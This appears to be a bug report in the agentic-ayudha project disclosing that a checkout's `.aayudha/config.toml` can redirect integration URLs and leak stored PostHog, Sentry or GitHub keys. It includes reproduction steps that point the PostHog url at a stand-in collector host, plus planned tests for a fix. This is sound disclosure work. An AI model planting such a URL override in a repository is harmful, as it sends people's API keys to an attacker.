# rahulnakmol/agentic-ayudha#598: A checkout's config can send a stored integration key to any host

### Ready snapshot

| | |
|---|---|
| Schema | work items v1, bug |
| Body hash | `73a01930fda662f8cb5d6c2803ee758fdf4abdb4281a8260a28a41776090b6f9` |
| Completion Goal hash | `35bba206a5cc6f928ced5bf0d99b5f7b363688ddcda1e410f22b711f156e4855` |
| Technical Owner | devops-devex-tinkerer |
| Written by | rahulnakmol (`identity:human-fallback`) |
| Ledger | `specs/598/ready.md` |

Completion Goal at Ready:

1. [api-trace] state: a checkout's `.aayudha/config.toml` and, separately, its `config.local.toml` setting `[integrations.posthog] url`, `[integrations.sentry] url`, and `[integrations.github] url` to `https://collector.example.com`; expected: the config load fails naming the integration and the user config, `AAYU_INTEGRATIONS__*` variables, and `--set` as the only places for that url
2. [api-trace] state: a checkout config with `url = "https://eu.posthog.com"` for PostHog and `url = "https://de.sentry.io"` for Sentry, and the user config, an `AAYU_INTEGRATIONS__POSTHOG__URL` variable, and `--set` each with `https://posthog.example.com`; expected: every one loads with that url
3. [api-trace] state: `aayu doctor` in a checkout whose `.aayudha/config.toml` points `[integrations.posthog] url` at a recording server, with a stored PostHog key; expected: doctor fails on the config and the server receives no request

Editing the body after Ready removes `status:ready` (Ready guard); run `aayu ready` again to re-snapshot.

## Body at Ready

````markdown
### Summary

A checkout's config can send a stored integration key to any host. `[integrations.<name>] url` is read from every config layer, including the repository's `.aayudha/config.toml` and `config.local.toml`, and each adapter (PostHog, Sentry, GrowthBook, Figma, Mobbin, GitHub reads) sends its stored key as `Authorization` to that URL (`integrations.Conn.BaseURL`). A pull request or a cloned repository that sets `[integrations.posthog] url = "https://collector.example.com"` therefore gets the person's PostHog key on the next `aayu doctor`, `measure`, `slo`, `runbook`, or `investigate --source`. Found by Codex's security review of PR #590 (comment r4306150210); it is older than that PR and affects every provider read.

### Steps to reproduce

1. Store a PostHog key with `aayu auth set-secret posthog` and configure `[integrations.posthog]` with `secret = "posthog"`, `scope = "read"`, and a project.
2. In the checkout's `.aayudha/config.toml` (or `config.local.toml`), add `url = "https://collector.example.com"` to `[integrations.posthog]`.
3. Run `aayu doctor`.

### Expected behaviour

The config load refuses the checkout's url, because only the provider's own cloud hosts may come from the checkout; a self-hosted or other URL comes only from the user config, an `AAYU_INTEGRATIONS__<NAME>__URL` variable, or `--set`. No request is sent.

### Actual behaviour

The config loads, and doctor sends the stored key to collector.example.com.

### Completion Goal

1. [api-trace] state: a checkout's `.aayudha/config.toml` and, separately, its `config.local.toml` setting `[integrations.posthog] url`, `[integrations.sentry] url`, and `[integrations.github] url` to `https://collector.example.com`; expected: the config load fails naming the integration and the user config, `AAYU_INTEGRATIONS__*` variables, and `--set` as the only places for that url
2. [api-trace] state: a checkout config with `url = "https://eu.posthog.com"` for PostHog and `url = "https://de.sentry.io"` for Sentry, and the user config, an `AAYU_INTEGRATIONS__POSTHOG__URL` variable, and `--set` each with `https://posthog.example.com`; expected: every one loads with that url
3. [api-trace] state: `aayu doctor` in a checkout whose `.aayudha/config.toml` points `[integrations.posthog] url` at a recording server, with a stored PostHog key; expected: doctor fails on the config and the server receives no request

### Measure

Completion Goal criteria observed

### Threshold

all 3 criteria

### Scenario

Load the config from fixture layers with each url placement, and run doctor against a recording server that counts requests.

### Environment

local checkout and this repository's CI build job on a pull request; no provider account

### Technical Owner

devops-devex-tinkerer

### Checkpoints

1. `go test ./internal/config -run TestIntegrationURLFromCheckout` shows the refusals and the accepted placements (criteria 1, 2)
2. `go test ./internal/cli -run TestDoctorRefusesCheckoutIntegrationURL` shows doctor sends nothing (criterion 3)

### Assumptions

- the provider cloud hosts a checkout may name are us.posthog.com and eu.posthog.com for PostHog; sentry.io and its subdomains (us.sentry.io, de.sentry.io, `<org>.sentry.io`) for Sentry; and each other adapter's default host (api.growthbook.io, api.figma.com, mcp.figma.com, api.mobbin.com, api.github.com)

### Provenance

Request: "a checkout's config must not be able to send a stored key to another host"
1. stated (Codex security review on PR #590, r4306150210): the provider url and secret come from the checkout config layer and the key is sent there
2. stated (parent thread): take provider URLs that receive a stored key only from user-level config, the environment or --set, as #535 did for [hosts.cursor] plan
3. stated (parent thread): "Regression test with a checkout config pointing at another host"
````
